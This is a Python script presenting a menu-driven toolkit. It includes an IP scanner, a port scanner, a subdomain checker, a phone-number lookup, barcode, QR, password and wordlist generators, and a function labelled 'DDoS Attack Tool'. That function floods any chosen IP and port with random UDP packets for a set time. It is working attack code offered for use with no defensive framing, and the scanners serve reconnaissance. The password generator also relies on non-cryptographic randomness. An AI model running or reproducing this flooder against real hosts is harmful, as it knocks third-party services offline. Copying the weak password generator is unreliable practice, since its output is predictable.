from dis import code_info
import socket
import qrcode
import barcode
from barcode.writer import ImageWriter
import random
import requests
import phonenumbers
from phonenumbers import geocoder, carrier, timezone
from datetime import datetime, timedelta
from urllib.parse import urlparse

# Function 1: IP Scanner
def ip_scanner(network_prefix):
    print(f"Scanning IPs in the network: {network_prefix}...\n")
    for i in range(1, 255):
        ip = f"{network_prefix}.{i}"
        try:
            socket.gethostbyaddr(ip)
            print(f"IP Found: {ip}")
        except socket.herror:
            continue

# Function 2: Port Scanner
def port_scanner(target, start_port, end_port):
    print(f"\nStarting port scan on target: {target}")
    print(f"Scanning ports from {start_port} to {end_port}...\n")
    start_time = datetime.now()
    for port in range(start_port, end_port + 1):
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        socket.setdefaulttimeout(1)
        result = sock.connect_ex((target, port))
        if result == 0:
            print(f"Port {port}: OPEN")
        sock.close()
    end_time = datetime.now()
    print(f"\nPort scan completed in {end_time - start_time}")

# Function 3: Barcode Generator
def barcode_generator(data, filename):
    ean = barcode.get('code128', data, writer=ImageWriter())
    ean.save(filename)
    print(f"Barcode saved as {filename}.png")

# Function 4: QR Code Generator
def qr_code_generator(data, filename):
    qr = qrcode.QRCode(
        version=1, error_correction=qrcode.constants.ERROR_CORRECT_L, box_size=10, border=4
    )
    qr.add_data(data)
    qr.make(fit=True)
    img = qr.make_image(fill_color="black", back_color="white")
    img.save(filename)
    print(f"QR Code saved as {filename}.png")

# Function 5: Password Generator
def password_generator(length):
    chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890!@#$%^&*()"
    password = ''.join(random.choice(chars) for _ in range(length))
    print(f"Generated Password: {password}")

# Function 6: Wordlist Generator
def wordlist_generator(words, filename):
    with open(filename, 'w') as file:
        for word in words:
            file.write(word + '\n')
    print(f"Wordlist saved as {filename}")

# Function 7: Phone Number Information Gathering


def phone_info(number):
    try:
        # Parse the phone number
        parsed_number = phonenumbers.parse(number)

        # Validate if the number is valid
        is_valid = phonenumbers.is_valid_number(parsed_number)

        # Get the region or country
        country = geocoder.description_for_number(parsed_number, "en")

        # Get the carrier (telecom provider)
        phone_carrier = carrier.name_for_number(parsed_number, "en")

        # Get the timezone
        time_zones = timezone.time_zones_for_number(parsed_number)

        # Print the details
        print("Phone Number Information:")
        print(f"Valid: {is_valid}")
        print(f"Country: {country}")
        print(f"Carrier: {phone_carrier}")
        print(f"Timezones: {', '.join(time_zones)}")

    except phonenumbers.phonenumberutil.NumberParseException as e:
        print(f"Error: {e}")

# Function 8: Subdomain Checker
def subdomain_checker(domain, subdomains):
    print(f"Checking subdomains for: {domain}\n")
    for sub in subdomains:
        url = f"http://{sub}.{domain}"
        try:
            response = requests.get(url)
            if response.status_code == 200:
                print(f"Subdomain found: {url}")
        except requests.ConnectionError:
            continue

# Function 9: DDoS Attack Tool
def ddos_attack(target, port, duration):
    print(f"Starting DDoS attack on {target}:{port} for {duration} seconds...\n")
    timeout = datetime.now() + timedelta(seconds=duration)
    while datetime.now() < timeout:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            sock.sendto(random._urandom(1024), (target, port))
        except Exception as e:
            print(f"Error: {e}")

# Main Menu
def main():
    while True:
        print("\nChoose an option:")
        print("1. IP Scanner")
        print("2. Port Scanner")
        print("3. Barcode Generator")
        print("4. QR Code Generator")
        print("5. Password Generator")
        print("6. Wordlist Generator")
        print("7. Phone Number Info Gathering")
        print("8. Subdomain Checker")
        print("9. DDoS Attack Tool")
        print("0. Exit")

        choice = input("Enter your choice: ").strip()

        if choice == "1":
            network_prefix = input("Enter the network prefix (e.g., 192.168.1): ")
            ip_scanner(network_prefix)

        elif choice == "2":
            target = input("Enter the target IP or hostname: ")
            start_port = int(input("Enter the starting port: "))
            end_port = int(input("Enter the ending port: "))
            port_scanner(target, start_port, end_port)

        elif choice == "3":
            data = input("Enter the data for the barcode: ")
            filename = input("Enter the filename to save the barcode: ")
            barcode_generator(data, filename)

        elif choice == "4":
            data = input("Enter the data for the QR code: ")
            filename = input("Enter the filename to save the QR code: ")
            qr_code_generator(data, filename)

        elif choice == "5":
            length = int(input("Enter the password length: "))
            password_generator(length)

        elif choice == "6":
            words = input("Enter words separated by spaces: ").split()
            filename = input("Enter the filename to save the wordlist: ")
            wordlist_generator(words, filename)

        elif choice == "7":
            phone_number = input("Enter the phone number: ")
            phone_info(phone_number)

        elif choice == "8":
            domain = input("Enter the domain: ")
            subdomains = input("Enter subdomains separated by spaces: ").split()
            subdomain_checker(domain, subdomains)

        elif choice == "9":
            target = input("Enter the target IP: ")
            port = int(input("Enter the target port: "))
            duration = int(input("Enter the duration of the attack in seconds: "))
            ddos_attack(target, port, duration)

        elif choice == "0":
            print("Exiting the tool. Goodbye!")
            break

        else:
            print("Invalid choice. Please try again.")

if __name__ == "__main__":
    main()
